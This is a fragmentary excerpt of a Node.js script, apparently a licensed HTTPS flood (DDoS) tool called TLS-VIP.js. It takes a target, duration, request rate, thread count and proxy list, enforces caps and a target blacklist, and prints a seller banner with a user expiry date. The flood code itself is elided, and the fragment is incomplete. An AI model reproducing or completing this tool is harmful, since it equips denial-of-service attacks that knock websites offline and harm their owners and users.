...
'*'
 ...
 if (process.argv.length < 7) {
  console.log('node TLS-VIP.js target time rate thread proxy.txt'.rainbow);
  process.exit();
}
 const headers = {};
...
if (blackList.includes(args.target)) {
  console.log("Website Is BlackListed.");
  process.exit(1);
}

if (args.time < 0 || args.time > 300) {
  console.log("Maximum Time: 300 sec.");
  process.exit(1);
}

if (args.Rate < 0 || args.Rate > 1024) {
  console.log("Maximum Rate: 1024.");
  process.exit(1);
}

if (args.threads < 0 || args.threads > 256) {
  console.log("Maximum Threads: 256.");
  process.exit(1);
}
...
const targetPort = parsedTarget.protocol === 'https:' ? 443 : 80;
    ...
    console.clear();
console.log('TLS-HTTPS : @Anonymous_3699'.rainbow);
...
console.log(`User : anonymous_3699 | Expiry : 30/11/2023`.rainbow);
